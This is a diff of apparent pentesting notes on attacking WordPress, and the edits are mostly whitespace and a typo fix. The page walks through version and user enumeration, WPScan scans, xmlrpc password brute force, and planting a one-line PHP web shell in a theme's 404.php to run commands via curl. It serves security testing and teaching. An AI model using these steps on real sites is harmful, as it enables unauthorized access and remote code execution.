@@ -22,40 +22,40 @@
 ## Enumeration <a href="#wordpress-discovery-enumeration" id="wordpress-discovery-enumeration"></a>
 
 * Viewing the page source with `cURL` and grepping for `WordPress` can help us confirm that WordPress is in use and footprint the version number.
-  * `curl -s http://<URL> | grep WordPress`&#x20;
+  * `curl -s http://<URL> | grep WordPress`
 * Browsing the site and perusing the page source will give us hints to the theme in use, plugins installed, and even usernames if author names are published with posts.
 * Navigate through the page source for each page, grepping for the `wp-content` directory, `themes` and `plugin` .
-  * `curl -s http://<URL/path> | grep themes` , `curl -s http://<URL/path> | grep plugin`&#x20;
+  * `curl -s http://<URL/path> | grep themes` , `curl -s http://<URL/path> | grep plugin`
 * Browse through the plugins, themes to obtain the version numbers and look for any known CVE's.
-* Readme.txt file available under `wp-content/plugins/<plugins>/readme.txt`  &  `wp-content/themes/<theme>/Readme.txt`
+* Readme.txt file available under `wp-content/plugins/<plugins>/readme.txt` & `wp-content/themes/<theme>/Readme.txt`
 
 ### Users <a href="#enumerating-users" id="enumerating-users"></a>
 
-* Login page found at `/wp-login.php`  throws error messages that helps to identify whether a user exist or not.&#x20;
+* Login page found at `/wp-login.php` throws error messages that helps to identify whether a user exist or not.
 
 ## Automated Scan
 
 * [WPScan](https://github.com/wpscanteam/wpscan) is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a blog are outdated or vulnerable.
-* WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from [WPVulnDB](https://wpvulndb.com/), which is used by WPScan to scan for PoC and reports. Token can then be supplied to wpscan using the `--api-token parameter`&#x20;
-* `sudo wpscan --url http://<URL> --enumerate -t 5 --api-token <value>`  <sup><sub>(enumerates vulnerable plugins, themes, users, media, and backups)<sub></sup>
-* `sudo wpscan --url http://<URL> --detection-mode aggressive --plugins-detection agressive`
+* WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from [WPVulnDB](https://wpvulndb.com/), which is used by WPScan to scan for PoC and reports. Token can then be supplied to wpscan using the `--api-token parameter`
+* `sudo wpscan --url http://<URL> --enumerate -t 5 --api-token <value>` <sup><sub>(enumerates vulnerable plugins, themes, users, media, and backups)<sub></sup>
+* `sudo wpscan --url http://<URL> --detection-mode aggressive --plugins-detection aggressive`
 
 ## Exploitation
 
 ### Login Bruteforce <a href="#login-bruteforce" id="login-bruteforce"></a>
 
-* WPScan uses two kinds of login brute force attacks, [xmlrpc](https://kinsta.com/blog/xmlrpc-php/) and wp-login.&#x20;
+* WPScan uses two kinds of login brute force attacks, [xmlrpc](https://kinsta.com/blog/xmlrpc-php/) and wp-login.
 * The `wp-login` method will attempt to brute force the standard WordPress login page, while the `xmlrpc` method uses WordPress API to make login attempts through `/xmlrpc.php`.
-* `sudo wpscan --password-attack xmlrpc -t 20 -U <username> -P rockyou.txt --url http://<URL>`&#x20;
+* `sudo wpscan --password-attack xmlrpc -t 20 -U <username> -P rockyou.txt --url http://<URL>`
 
 ### Code Execution <a href="#code-execution" id="code-execution"></a>
 
 * With administrative access to WordPress, we can modify the PHP source code to execute system commands.
 * Click on `Appearance` on the side panel and select Theme File Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme.
 * Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell.
-  * `system($_GET[0]);`  <sup><sub>(code to be added to the theme's php file)<sub></sup>
+  * `system($_GET[0]);` <sup><sub>(code to be added to the theme's php file)<sub></sup>
 * Click on `Update File` at the bottom to save. We know that WordPress themes are located at `/wp-content/themes/<theme name>`. We can interact with the web shell via the browser or using `cURL`.
-* `curl http:/<URL>/wp-content/themes/<theme-name>/404.php?0=id`&#x20;
+* `curl http:/<URL>/wp-content/themes/<theme-name>/404.php?0=id`
 * Use [wp\_admin\_shell\_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) metasploit module as well.
 
 ### Leveraging Known Vulnerabilities <a href="#leveraging-known-vulnerabilities" id="leveraging-known-vulnerabilities"></a>
